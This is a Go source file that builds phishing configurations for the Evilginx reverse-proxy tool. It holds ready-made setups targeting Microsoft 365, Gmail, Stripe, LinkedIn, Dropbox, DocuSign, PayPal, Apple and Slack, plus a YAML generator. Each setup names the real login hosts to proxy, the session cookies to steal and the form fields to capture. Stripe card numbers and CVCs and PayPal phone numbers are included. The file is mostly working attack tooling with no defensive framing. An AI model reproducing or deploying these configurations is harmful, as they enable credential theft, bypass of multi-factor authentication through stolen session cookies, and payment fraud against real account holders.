package evilginx

import (
	"fmt"
)

// PhishletConfig represents configuration for an Evilginx phishlet
type PhishletConfig struct {
	Name           string              `json:"name"`
	Author         string              `json:"author"`
	MinVersion     string              `json:"min_version"`
	ProxyHosts     []ProxyHost         `json:"proxy_hosts"`
	SubFilters     []SubFilter         `json:"sub_filters"`
	AuthTokens     []AuthToken         `json:"auth_tokens"`
	Credentials    CredentialConfig    `json:"credentials"`
	LoginURL       string              `json:"login_url"`
	ForcePost      bool                `json:"force_post"`
	CustomJS       string              `json:"custom_js,omitempty"`
}

// ProxyHost defines a host to proxy
type ProxyHost struct {
	PhishSub   string `json:"phish_sub"`
	OrigSub    string `json:"orig_sub"`
	Domain     string `json:"domain"`
	Session    bool   `json:"session"`
	IsLanding  bool   `json:"is_landing"`
}

// SubFilter defines string substitutions
type SubFilter struct {
	TriggerDomains []string      `json:"triggers_on"`
	OrigSub        string        `json:"orig_sub"`
	Domain         string        `json:"domain"`
	Search         string        `json:"search"`
	Replace        string        `json:"replace"`
	Mimes          []string      `json:"mimes"`
	RegExp         bool          `json:"regexp,omitempty"`
}

// AuthToken defines authentication tokens to capture
type AuthToken struct {
	Domain   string   `json:"domain"`
	Keys     []string `json:"keys"`
	Type     string   `json:"type"` // cookie, local_storage, auth_header
}

// CredentialConfig defines credential capture settings
type CredentialConfig struct {
	Username CredentialField `json:"username"`
	Password CredentialField `json:"password"`
	Custom   []CredentialField `json:"custom,omitempty"`
}

// CredentialField defines how to capture a credential field
type CredentialField struct {
	Key   string `json:"key"`
	Search string `json:"search"`
	Type   string `json:"type"` // post, json
}

// Microsoft365Phishlet returns a pre-configured Microsoft 365 phishlet
func Microsoft365Phishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "microsoft365",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "login",
				OrigSub:   "login",
				Domain:    "microsoftonline.com",
				Session:   true,
				IsLanding: true,
			},
			{
				PhishSub: "www",
				OrigSub:  "www",
				Domain:   "office.com",
				Session:  true,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"login.microsoftonline.com"},
				OrigSub:        "login",
				Domain:         "microsoftonline.com",
				Search:         "login.microsoftonline.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json", "application/javascript"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".office.com",
				Keys:   []string{"ESTSAUTH", "ESTSAUTHPERSISTENT"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "username",
				Search: "login",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "passwd",
				Search: "login",
				Type:   "post",
			},
		},
		LoginURL:  "/",
		ForcePost: false,
	}
}

// GmailPhishlet returns a pre-configured Gmail phishlet
func GmailPhishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "gmail",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "accounts",
				OrigSub:   "accounts",
				Domain:    "google.com",
				Session:   true,
				IsLanding: true,
			},
			{
				PhishSub: "mail",
				OrigSub:  "mail",
				Domain:   "google.com",
				Session:  true,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"accounts.google.com"},
				OrigSub:        "accounts",
				Domain:         "google.com",
				Search:         "accounts.google.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".google.com",
				Keys:   []string{"SID", "SSID", "HSID", "APISID", "SAPISID"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "identifier",
				Search: "identifier",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "password",
				Search: "password",
				Type:   "post",
			},
		},
		LoginURL:  "/",
		ForcePost: false,
	}
}

// StripePhishlet returns a pre-configured Stripe phishlet
func StripePhishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "stripe",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "dashboard",
				OrigSub:   "dashboard",
				Domain:    "stripe.com",
				Session:   true,
				IsLanding: true,
			},
			{
				PhishSub: "api",
				OrigSub:  "api",
				Domain:   "stripe.com",
				Session:  false,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"dashboard.stripe.com"},
				OrigSub:        "dashboard",
				Domain:         "stripe.com",
				Search:         "dashboard.stripe.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".stripe.com",
				Keys:   []string{"session", "machine_identifier"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "email",
				Search: "email",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "password",
				Search: "password",
				Type:   "post",
			},
			Custom: []CredentialField{
				{
					Key:    "cardNumber",
					Search: "cardNumber",
					Type:   "post",
				},
				{
					Key:    "expiry",
					Search: "expiry",
					Type:   "post",
				},
				{
					Key:    "cvc",
					Search: "cvc",
					Type:   "post",
				},
			},
		},
		LoginURL:  "/login",
		ForcePost: true,
	}
}

// LinkedInPhishlet returns a pre-configured LinkedIn phishlet
func LinkedInPhishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "linkedin",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "www",
				OrigSub:   "www",
				Domain:    "linkedin.com",
				Session:   true,
				IsLanding: true,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"www.linkedin.com"},
				OrigSub:        "www",
				Domain:         "linkedin.com",
				Search:         "www.linkedin.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".linkedin.com",
				Keys:   []string{"li_at", "JSESSIONID", "liap"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "email",
				Search: "session_key",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "password",
				Search: "session_password",
				Type:   "post",
			},
		},
		LoginURL:  "/",
		ForcePost: false,
	}
}

// DropboxPhishlet returns a pre-configured Dropbox phishlet
func DropboxPhishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "dropbox",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "www",
				OrigSub:   "www",
				Domain:    "dropbox.com",
				Session:   true,
				IsLanding: true,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"www.dropbox.com"},
				OrigSub:        "www",
				Domain:         "dropbox.com",
				Search:         "www.dropbox.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".dropbox.com",
				Keys:   []string{"t", "gvc"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "email",
				Search: "login_email",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "password",
				Search: "login_password",
				Type:   "post",
			},
		},
		LoginURL:  "/login",
		ForcePost: false,
	}
}

// DocuSignPhishlet returns a pre-configured DocuSign phishlet
func DocuSignPhishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "docusign",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "account",
				OrigSub:   "account",
				Domain:    "docusign.com",
				Session:   true,
				IsLanding: true,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"account.docusign.com"},
				OrigSub:        "account",
				Domain:         "docusign.com",
				Search:         "account.docusign.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".docusign.com",
				Keys:   []string{"DocuSignSessionDomain", "JSESSIONID"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "email",
				Search: "email",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "password",
				Search: "password",
				Type:   "post",
			},
		},
		LoginURL:  "/",
		ForcePost: false,
	}
}

// PayPalPhishlet returns a pre-configured PayPal phishlet
func PayPalPhishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "paypal",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "www",
				OrigSub:   "www",
				Domain:    "paypal.com",
				Session:   true,
				IsLanding: true,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"www.paypal.com"},
				OrigSub:        "www",
				Domain:         "paypal.com",
				Search:         "www.paypal.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".paypal.com",
				Keys:   []string{"cookie_prefs", "tsrce", "ts_c", "x-pp-s"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "email",
				Search: "login_email",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "password",
				Search: "login_password",
				Type:   "post",
			},
			Custom: []CredentialField{
				{
					Key:    "phone",
					Search: "phone",
					Type:   "post",
				},
			},
		},
		LoginURL:  "/signin",
		ForcePost: false,
	}
}

// ApplePhishlet returns a pre-configured Apple iCloud phishlet
func ApplePhishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "apple",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "idmsa",
				OrigSub:   "idmsa",
				Domain:    "apple.com",
				Session:   true,
				IsLanding: true,
			},
			{
				PhishSub: "www",
				OrigSub:  "www",
				Domain:   "icloud.com",
				Session:  true,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"idmsa.apple.com"},
				OrigSub:        "idmsa",
				Domain:         "apple.com",
				Search:         "idmsa.apple.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".apple.com",
				Keys:   []string{"myacinfo", "aasp"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "email",
				Search: "accountName",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "password",
				Search: "password",
				Type:   "post",
			},
		},
		LoginURL:  "/",
		ForcePost: false,
	}
}

// SlackPhishlet returns a pre-configured Slack phishlet
func SlackPhishlet() *PhishletConfig {
	return &PhishletConfig{
		Name:       "slack",
		Author:     "gophish-labs",
		MinVersion: "2.3.0",
		ProxyHosts: []ProxyHost{
			{
				PhishSub:  "{subdomain}",
				OrigSub:   "{subdomain}",
				Domain:    "slack.com",
				Session:   true,
				IsLanding: true,
			},
		},
		SubFilters: []SubFilter{
			{
				TriggerDomains: []string{"{subdomain}.slack.com"},
				OrigSub:        "{subdomain}",
				Domain:         "slack.com",
				Search:         "{subdomain}.slack.com",
				Replace:        "{domain}",
				Mimes:          []string{"text/html", "application/json"},
			},
		},
		AuthTokens: []AuthToken{
			{
				Domain: ".slack.com",
				Keys:   []string{"d", "d-s"},
				Type:   "cookie",
			},
		},
		Credentials: CredentialConfig{
			Username: CredentialField{
				Key:    "email",
				Search: "email",
				Type:   "post",
			},
			Password: CredentialField{
				Key:    "password",
				Search: "password",
				Type:   "post",
			},
		},
		LoginURL:  "/",
		ForcePost: false,
	}
}

// GeneratePhishletYAML generates YAML configuration for Evilginx
func (pc *PhishletConfig) GeneratePhishletYAML() string {
	yaml := fmt.Sprintf("name: %s\n", pc.Name)
	yaml += fmt.Sprintf("author: %s\n", pc.Author)
	yaml += fmt.Sprintf("min_ver: '%s'\n\n", pc.MinVersion)

	yaml += "proxy_hosts:\n"
	for _, ph := range pc.ProxyHosts {
		yaml += fmt.Sprintf("  - {phish_sub: '%s', orig_sub: '%s', domain: '%s', session: %t, is_landing: %t}\n",
			ph.PhishSub, ph.OrigSub, ph.Domain, ph.Session, ph.IsLanding)
	}

	yaml += "\nsub_filters:\n"
	for _, sf := range pc.SubFilters {
		yaml += fmt.Sprintf("  - triggers_on: %v\n", sf.TriggerDomains)
		yaml += fmt.Sprintf("    orig_sub: '%s'\n", sf.OrigSub)
		yaml += fmt.Sprintf("    domain: '%s'\n", sf.Domain)
		yaml += fmt.Sprintf("    search: '%s'\n", sf.Search)
		yaml += fmt.Sprintf("    replace: '%s'\n", sf.Replace)
		yaml += fmt.Sprintf("    mimes: %v\n", sf.Mimes)
	}

	yaml += "\nauth_tokens:\n"
	for _, at := range pc.AuthTokens {
		yaml += fmt.Sprintf("  - domain: '%s'\n", at.Domain)
		yaml += fmt.Sprintf("    keys: %v\n", at.Keys)
	}

	yaml += "\ncredentials:\n"
	yaml += fmt.Sprintf("  username:\n")
	yaml += fmt.Sprintf("    key: '%s'\n", pc.Credentials.Username.Key)
	yaml += fmt.Sprintf("    search: '%s'\n", pc.Credentials.Username.Search)
	yaml += fmt.Sprintf("  password:\n")
	yaml += fmt.Sprintf("    key: '%s'\n", pc.Credentials.Password.Key)
	yaml += fmt.Sprintf("    search: '%s'\n", pc.Credentials.Password.Search)

	if len(pc.Credentials.Custom) > 0 {
		yaml += "  custom:\n"
		for _, cf := range pc.Credentials.Custom {
			yaml += fmt.Sprintf("    - key: '%s'\n", cf.Key)
			yaml += fmt.Sprintf("      search: '%s'\n", cf.Search)
		}
	}

	yaml += fmt.Sprintf("\nlogin:\n")
	yaml += fmt.Sprintf("  url: '%s'\n", pc.LoginURL)

	return yaml
}
